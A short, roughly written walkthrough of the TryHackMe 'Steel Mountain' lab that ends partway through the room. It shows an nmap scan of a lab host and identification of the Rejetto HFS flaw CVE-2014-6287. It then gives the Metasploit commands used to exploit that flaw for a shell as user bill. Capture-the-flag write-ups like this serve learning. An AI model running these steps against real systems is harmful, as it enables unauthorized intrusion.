# THM-SteelMountain
I lerarn how haced the Windows machine. I use metasploit for initial access, utilise powershell for Windows privilege escalation enumeration and I learn a new technique to get Administrator access.
< THM Steel Mountain room

#Task1 Open website in adress 10.10.135.167 in Virtaul Machine. I open page source preview to see name employee of the month: Bill Harper

![This is an image]()


#Task2 I scan maschin the command: nmap -sV -sC 10.10.135.167 and I find running web serwer on 8080 port. And another serwer Rejetto HTTP File Server

![This is an image]()


#Task3 I find in exploit-database exploit "Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)" with number CVE-2014-6287.

![This is an image]()


#Task4 I Use Metasploit to get an initial shell.
Command: 
msfconsole
search CVE-2014-6287
use 0
options
set RHOST 10.10.135.167
set RPORT 8080
exploit

![This is an image]()

#Task5 now I have access to system bill and I must find Desktop and user flag. I use many tims command cd .. that  I been in directory C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs and I want go to Desktop. 

![This is an image]()
![This is an image]()
![This is an image]()
![This is an image]()
![This is an image]()
